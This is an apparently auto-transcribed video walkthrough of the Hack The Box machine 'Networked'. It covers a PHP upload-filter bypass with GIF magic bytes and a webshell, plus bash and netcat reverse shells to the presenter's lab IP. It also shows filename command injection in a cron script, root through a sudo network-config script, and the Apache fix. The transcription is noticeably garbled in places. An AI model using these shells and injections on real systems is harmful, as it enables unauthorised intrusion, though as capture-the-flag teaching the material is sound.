 what's going on YouTube the zipsak and we're gonna be doing network from hack the box and first off I'm just getting over a cold so I may sound congested but that being said the box itself is relatively easy as long as you can read source code it starts off with the typical PHP upload vulnerability which you really don't need the source to complete especially because they messed up on the error messages and a slightly different based upon each part of the image validation however there is the source code in the backup directory and the challenge becomes really easy after that once you get a shell on the box you got to find a cron job that's executing a PHP script find the vulnerability in that script get a shell as the user that is the cron job and then finally there's a script to rename network interfaces that give you write access over the network configs grips and you get code execution there too so let's just jump in as always we start off with an episode - I see four default scripts SV and the r8 versions Oh a output all formats pin the end map direct rain : Network and then the IP address which is 10 10 10 1:46 10 take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on port 22 and it's spanner unlike most boxes we do is not leaking the type of OS we just see OpenSSH 7.4 then we also have HTTP listening on port 80 and running Apache HTTP D and it is leaking the type of our wes it is at centers which is pretty much the open-source version of Red Hat Enterprise Linux then we also have it telling us it runs PHP 5.4 these scripts tell us that well it is Apache we knew that then we also have HTTP title that says the site doesn't have a title so they didn't put that HTML tag in the web page and we also have 443 is set to closed so this means that IP tables sent to us a reject packet so a map is telling us it is closed so let's just go check it over on port 80 so going to 10 10 10 146 I think it was we just get elimate we're building the new Facemash help us by funding the new Tyler and Cameron join us for a pool party and this Saturday and get a glimpse looking at the page source we don't really see anything we have up load and gallery not yet linked so you could probably guess you want to go to like slash uploaded slash gallery but we won't do that there's robots.txt it says not found so I'm gonna go over to the trusty go Buster so go Buster directory mode - you for your l HTTP 10-10-10 146 - w4 word list users share word list doorbuster then we'll do directory list 2.3 I'm just gonna do small dot text I'm also going to set - X for PHP and this is just gonna depend everything in this direct append dot PHP - everything in this world list and the reason I did that because I saw the actual web server header back in my head maps can told us that it ran PHP right here so that's why - the - x ph b we have index dot PHP which is the default slash uploads photos our PHP upload dot PHP and Lib dot PHP so let's go take a look at that while dur buster runs so if we go to slash uploads it is blank nothing there we do have a period and that is it if we go to what was it photos our PHP we get a list of photos if we go to upload dot PHP we see a file upload thing so let's just try uploading a PHP script so what I'm gonna do is V epic PHP I'm just gonna say PHP get and then actually one system and then get please subscribe if I can tell you holy crap so this will be much more apparent to you once we start running it but essentially this is going to grab the HTML get variable please subscribe and pass it to the system command which executes sit so just a very simple PHP show so let's go to upload and then I'm going to press ctrl L so I can enter my file location I say a man root HT B boxes networked and let's just try EPS at PHP and I'm going to click on foxy proxy sent to burp suite because I always like intercepting these separate requests turn my intercept on click go go back over to burp control are to go to repeater control shift are to go to that tab and we'll click send it says invalid image file so I'm just gonna say what if this was a gif or Jif it also tells us invalid image file so this is a problem but going back over to go Buster we do see there is a slash backup directory so let's go take a look at what is it / backup so 10 10 10 146 slash backup and we can turn the proxy off okay go and there is a file called backup car I'm going to download this two ways we're going to down list through Firefox and click it okay I'm also going to copy the link and download this with W get just to show you something cool so if we do LS - la downloads backup turn and then backup guitar again so this going to grab the one out of Firefox and then grab the one that W get did and we can see Firefox sets the file modification date to the what day it is so it is currently in that before teenth but w get pulls it from what the server is and doesn't change it and that was my phone sorry about that so if we look at exit tool we can probably see some other metadata that Firefox may clobber but let's just check this out real quick let's just do downloads backup doctor so looking at the two we can see the only thing that W get didn't was the file modification date the access and inode is today's date but again Firefox does not I mean W get does not clog with that while Firefox does so just something to keep in mind so let's just extract that tar so tired - xvf for extract reversed file backup door and we get for PHP files so I'm just going to make the directory SRC for source move all PHP into source and let's go examine it so the first thing I want to look at is index dot PHP and we can move it SEC out of that because that's my shell but no PHP actually in index if we can't live dot PHP we just get a bunch of functions and if we cat photos this is a bit big so let's just cat upload so every file has quite a bit of code so the quick way to analyze all this is just do grep - RI and i think this is called super global the dollar underscore and this is just a easy way for user input to get passed into PHP and whenever looking for vulnerabilities the first thing I'm going to look for is what can a user do so this is gonna show us how a user interacts with the server and we can see let's see under a dollar underscore server this is not going to be user related so we could ignore those let's see if post submit is set that's interesting we have files so let's see files again server server so I don't know exactly what files is so if we just Google like PHP underscore files you can see what this variable is and we can also do PHP superglobals if you want to look at exactly what that meant but essentially it's just variables that are always going to be available that is set by the server so the superglobals are global server this is gonna be like server configuration get this is past in the URL post this is past below the HTTP request or in the HTTP request I should say files this is a type of post cookie this is in the header session is the PHP session cookie request is either get or post maybe something else as well and and probably just the PHP environment so there's the super global variables the main ones were curious about or probably these for and request as well so there's the ones we are really interested in so let's go take a look at upload dot PHP and look at this post submit thing and if we go over to a request if we look for submit we do have a setting it name is equal to submit so go to the top of this here we are so the very first thing it's gonna do is check the file type and check the file size we don't want it to be over I guess 60,000 bytes I think that is serves like sixty Meg's maybe or six Meg's so we don't want it to be large but we also need to check out what this check file type is because if this check file type is returns I guess error then we just get an error code or maybe something different oh we get invalid image file if this doesn't return I don't know when this would be error maybe I don't know but yeah so we have to get this to return true check file type so let's just do another grip so grep check file on everything and that is in Lib PHP so V Lib PHP check file type and we can see this is doing mime type and then looking for any mime with image slash in it and mime types are generated by match bytes so if you look at like what is a magic byte it's just the first few bites of a file that tells the system what it is so the most common one is like gif eight will tell it it's a gift so if it begins with MZ it's DOS MZ PE it's PE 32 so we go to this and echo MZ to test text and run file on test dot text huh right there and do it maybe file test text xxd test dot text that is for d5 a 45 days so maybe that's the bad one to do it with let's just do I will try this elf executable so I think that was just darn elf is that what it said Wow so maybe this isn't working as easy as I thought it would let's do this really wish I had prepared more for this so I don't run into all these issues file test start X there we go so we do X X D on this I guess oh it's capital e LF not lowercase so we can see just by adding those magic bytes now file thinks it's an elf file so if we did random things let's do non ASCII so this follow test text it just says data if it was just straight ASCII characters it says ASCII so you should get an idea of exactly what's going on so if we do we don't need Python anymore echo if 8 semicolon please subscribe file test text we get it's a gif so that is how we'll check this PHP script into doing it so we do check file type let me see it runs this command file mime type and that will do the getting the mime I think it's this F info file we could probably test this out huh let's just try it you don't need get Buster anymore PHP - eh we call it a test text so I do X is equal to F info file we need X is equal to F in fill open file info mime okay then mime is equal to F info file F X I just called F info X and then the file name so this will be testy XD oh oh SRC / because I'm in a different pain and files actually in the SRC directory so if we look at mime let go there we go it's image / gif so all the code is doing is taking what image slashes so that was a long way to explain this piece of the puzzle so if we do if 8 semicolon and if we didn't have this dot gif and we sent it we still get invalid image file and that is because they also check the name so if we go back let's see check file type this is file mime type okay now let's go back to upload [Music] come on upload dot PHP okay let's see so here it is so I'm just making sure these error messages are exactly the same so we have an error occurred period if it's a invalid mime type and then if it's a bad name we just get I think invalid image file yes so if you didn't have the source this is how you could tell you progressed so if we just got rid of gif 8 click send we see invalid image file period purse multi-part form data 403 bytes if you put this gif 8 you see 398 bytes it doesn't have that period so always pay attention to exactly what the error message is and one does pre the other one just does P so always handy if you're analyzing application without source to look at the error messages because if they don't have a function that returns the error message chances are they're not identical and you can find out you're in a different piece of the code so now we have to make sure the file has dot JPEG PNG gif or whatnot and right here is it's doing the very last extension so we can only upload files that end in like an image format so we do PHP gif we see file has been uploaded refresh the gallery so go into Firefox then going back to the page we can just do uploads we don't see anything but there was what gallery dot PHP what was it I did not save dirt Buster results that sucks this is why you always do out files so let's see I thought it was gallery dot PHP not found slash gallery let's just do go Buster again so go Buster and this time - W root dir - Oh file file there we go so index dot PHP uploads photos is it photos dot PHP photos dot PHP there it is so we can see a new upload if we go to view image we have uploads and then the date dot gif so we probably get it just analyze the source code and figure it out oh it does the IP address dot PHP dot gif so that's how you upload if we do was it please subscribe is equal to Who am I we can see it get returns Apache if we did like the ID command it returns the ID and again this is just all because of a little PHP shell that we uploaded if set dot PHP it's doing the get against the please subscribe variable so the next thing is to get a reverse shell so what I'm going to do is send - boo because I don't want to euro Landcare things if you have multiple variables it separates them by end and then Firefox will automatically say hey here's an end go do something else so separate the argument we want you encode it so the web server doesn't treat it as a separate argument so it's just a bad character that we have to deal with go to the proxy tab we can drop this request because we don't need it fresh this well you're not intercepting intercept gone don't I'm much of what I clicked let's see oh because it's returning the mime type of an image and we're not configured to intercept images so if we did a repeater send purpose thinking this is a image and in this options tab file extension oh the file extensions done gift yeah so it executes this honestly I was not expecting this to work when I originally did the box because generally Apaches configured our way with files have to end in like dot PHP dot PHP 5.3 hp7 just end in dot PHP this you just had to have PHP in the name so we'll look at the configure we do this box to see exactly why that was but we got code execution so let's go and do a reverse shell so Bash - I was directed to the and dev TCP 1010 14 3 which should be my IP address if config tun 0 1010 14 3 that is slash 9000 1 and then 0 and 1 to direct it to this I'm going to highlight it control you to your own code it NC l vnp 9001 go to Bert click send we don't get a response back that is good because we got the shell so now what I'm always going to do is get a proper shell because if I things like tab and up it just acts odd so Python - C import PT y PT y dot spawn then - okay control Z - background it s TTY raw - echo FG enter enter again there we go now I have the up arrow and stuff so everything works as it should so if we go into slash home we can see that we can go into the deli directory so if we go in here there are a few files and the reason why I was checking this is because I want to know what user text is so we found using our text unfortunately only gully can read it and if you remember when we did whoever might see the web server we are Apache so we have to find a way to get to the gully user there is a vim info file if we cat that we get permission alright because only go I can read it there is crontab and check attack so if we look at crontab we have it executing this PHP script check attack PHP so let's look at check attack PHP and I'm just going to copy it to my box export term is equal to X term just because it would be a bit prettier so basics t4 - w0 check attack and let's see copy this film check attack I will just add to it base 64 - t shark attack dot PHP so now we got this file so let's see well loading the file very dub dub dub HTML Lib PHP so the first thing I want to do is see if I can change that so ver dub dub dub Lib well burned up the dub HTML let's see Lib dot PHP owned by root and we can only read it so we can't change this if we could change it no you just get cured execution by modifying it and running yeah and since the crontab execute several minutes as gulley we'd get to his user so we just gotta find a way to execute codes through this script so this is sending the message file so it's skander is like LS and PHP so if we did we go back and do PHP - a skander or period echo oh it's gonna be an array um I forget how to deal with that in PHP forget the command right now just trust me it's maybe it's explode it's exploded one let's try this and nope this is going to bother me PHP print array turn Boop off print underscore R there we go so there it is we can see dot swap exists because I have the file open in vim but that's what that's doing it's going through that array and going through each file name so where were we okay so we're here it's gonna run get name check and get check IP and then let's see if check so get name check let's see what this is ah let's not I don't feel like going through all that code but we'll see more of these go and not look for vulnerabilities in theirs because I don't think their ID just keep going through so attack detected let's see check zero yeah so this is saying if check is not equal to 0 then we detect an attack and we're going to put the content somewhere and remove it so this is a dangerous function in PHP to do exact when you should be doing like unlink I think it's unlink in PHP but exec is like system you can execute anything if you just did unlink then it would just delete the file so because they're using exec there may be other things we can do so let's see RM - f log path walk path is hard-coded to temp attack not log we don't have control of that variable exec RM - f path hard-coded we don't have control value value is what is value you're going to value its check check IP name value it's the file name so this is the skander so the phoneme we can control the phoneme because we can put files in it so we just have to make sure this check is zero go down this function and then we'll get code execution here because we can put a file with like a semicolon in it so if it's running this command and expecting like slash path slash file txt well what if we made fall txt semicolon malicious command it's going to end that RM - f and then execute malicious command so that's what we're going to be doing so let's just try this and if it doesn't work in three minutes would dig through check IP and get name check so we make sure that the script thinks attacking it but if we put a malicious file in it should think we're attacking it so let's go back to the machine we got to go into the uploads directory and now I'm going to do touch and then two dashes and that's just gonna mean hey I'm done doing arguments just let me type whatever I want so semicolon oh let's see what can we do let's do NC - H to see what version of netcat we have do we have the - see it looks like we do for command - C command yes we do so in phonemes you can't use slashes so that cut could get rid of how I was gonna do the like this command would it work because I have slashes and I can't have a slash in a file name so that's why I was looking at netcat to see if we had one that I could just do NCC bash 1010 14-3 9001 so we just got to touch - - semicolon like that then we do semicolon dot PHP so it thinks it ends in PHP just because we want the web server to think this is as malicious as possible and dropping a PHP file in the upload directory sounds pretty malicious so if we print directory we're there actually we really should set that show so let's see you can see the file name semicolon NCC bash 10 10 14 3 9001 so if we run date let's see we probably gotta wait another two and a half minutes so I'm just gonna pause the video in order to zoom in three or four minutes so hold on so I just got the shell if we do date again we can see it's been almost exactly three minutes we don't really have a prom dear that's why I always do the verbose flag with netcat because if I didn't do it it would never tell me there was a connection and I just be waiting forever but if I type good way am i we can see we have a shell it's just not giving us the bash prompt so I'm gonna do Python - see import PTY and then PT why not spawn then - and then we do that s TTY raw - echo for ground and then export term is equal to X term there we go and right now you may be thinking what the hell just happen because I have two ports listening on 9001 however with Linux when you do netcat and then you get a connection it's no longer listening so if I do SSL NP grab 9001 there's nothing listening and SS is just a new netstat so if I did n CL VMP 9001 ran that same command you can see we are listening but when we connect 0:01 we're no longer listening so you can reuse ports like that definitely comes in handy so going back here we can now get user dot text and this is normally when I would just run Linda knew but because I'm gain time talking we're just going to do sudo - L and see exactly what this user can do linen oom just does a bunch of basic previs checking if you just google github lin a noob like that you can find it here and run this but one of the things that says is this output and we can see Joey maybe we'll run this file as root so let's see what this is OSR way on this file we can't modify it it's owned by root and we don't have right so let's just look at exactly what this is copied over to my host machine because it's just easier to read so b64 it copy and then we'll do at go - n paste base64 - G check dot Sh or something I forget what it was but we can see what this is doing it's doing cat - Etsy sis config Network scripts if config Gulley's so this is just writing a file it's a weird way to write file you can cat direct it to this and then input until yo F which stands for and end a file this stuff so that just writes a file if you wanted to see that you can do it like cat - please subscribe yo f don't forget about patreon and then yo f and this will terminate my command and it wrote the file please subscribe so that's all that's doing writing a file now we have regular expression and this means any of these characters are allowed I guess and this backslash space means spaces are allowed so for variable in name proxy method browser only boot proto do echo interface and then the VAR read X is asking a user for input so it's saying hey give me the variable for name so this is just input you'll see when we go on it wile X is somewhat equal to the regular expression so while this is valid do echo this to the file so I think if we just Google let's see if I can find this real quick Linux network configuration RCE I think was on RedHat or a full disclosure let's see if we can find it Oh seee [Music] let's do Linux f CFG script RCE execute code space man that was a [ __ ] wall typing thankfully Google fixes let's see if config script RCE let's do full disclosure Red Hat not security okay so this is the post I was looking for we didn't like Network scripts RCE you'd see it but if you want to read more go to this post it kind of explains it essentially all this is is a bash script and when you do variables if we echo please sub doesn't do anything but if we do please sub is equal to 2 if SEC I thought that would work okay did I screw it but with a typo or something I really thought that would work okay my understanding of it strong exactly what that does to set the path but if you do like it include this file and you have a space so x equals please sub to EMI it's gonna run the command so the key thing to take in this thing was it was still running echo so what this will do we can go back into the file checked out SH if we put a space in any of the variables then when it reads this if config file it will execute it so if up is just going to take this interface source the config and turn it off so what we want to do is run sudo - L sudo user local been change name interface name please subscribe sure we'll just do support patreon Twitter and then just going to type bash after this boot proto rtcp sure we see we get a root shell because when it executed this script if we cat this where was it the script is what we just executed it's doing a source and setting all these variables so device is equal to go a zero on boot and M control name proxy method browser only and then it's actually running the command because there's a space here so that's where that's doing bit obscure and pretty cool way to get command execution through these type of scripts and persistence and things like that but generally and with both windows and linux whenever you can write files arbitrarily on an OS chances are you can also execute code so with all that being said let's just go into the very last thing and look at exactly why we could execute code because doing this should not work so we do who am I here because the file does not end in dot PHP we shouldn't get this code execution we should just see the PHP code so we go into let's just go kampf dot d cat PHP comp we can see there's a lack of comments which generally means a user created this file because it was put there by like a package management system let's see do I have it Apache to Kampf dot d - enabled little get security calm you can see there's tons and tons of comments so the lack of comments probably means there was an jammed and the issue with this is right here there's no like dollar signs saying hey make sure this file ends all this is saying hey make sure to dot php' exists in the file so if we went to ver dubbed of HTML uploads and then did like echo PHP let go test okay direct this to test gif and we go to burp and just do test gif it doesn't execute the code because dot PHP is not in there so if we do like dot PHP test gif we have wait dot PHP test weird t dot PHP DST maybe that let's see T dot PHP dot PSD okay so something just has to be before the PHP so if we wanted to secure this web server let's go back to that directory then PHP Kampf we want to make sure this ends in PHP and the standard way to do that is just through the files match dot PHP dollar like that and then we can do slash files match and we need an S here there we go and be good people and do that so this will match files that end in PHP so if we now go back to this script it wasn't even found on the server so let's create that file again click send o service Apache to restart a service httpd restart I should be using like systemctl reload or whatever but I just don't notice this one CT all that well o systemd surprisingly come on come back up web server do I have an error message PHP is definitely taking its sweet time Apache saying it sweet time to reload oh it may instead be grabbed 80s s LNP grep 80 C grep Apache I bet it's waiting for my shell to die service httpd restart let's see go here make dot Sh ok let's just put a root key here exit exit preset ssh-keygen - f networked ed ideas tap network Pub okay echo this to authorized underscore keys chmod 686 hundred networked Shi networked 10-10-10 146 can I get in yes I'm in so let's go on this show okay there we go so now apaches working ver dub dub dub HTML uploads so in order to just not get stuff deleted we can do it in HTML so we can echo test dot PHP dot gif shoot PHP will just do PHP info let's the type to this there we go so let's do test dot PHP dot gif and we see it literally just printed the PHP info the tag if we do test dot PHP to make sure a script still or a service don't execute PHP code to begin with it does so here's the PHP info page so that would be how you fix it so if we again go into Apache for httpd.conf D PHP calm remove these service h-2b restart this test dot PHP gif will now return the stuff so that's the miss configuration and that'll do it for the box I hope you guys enjoyed it take care and I will see you all next week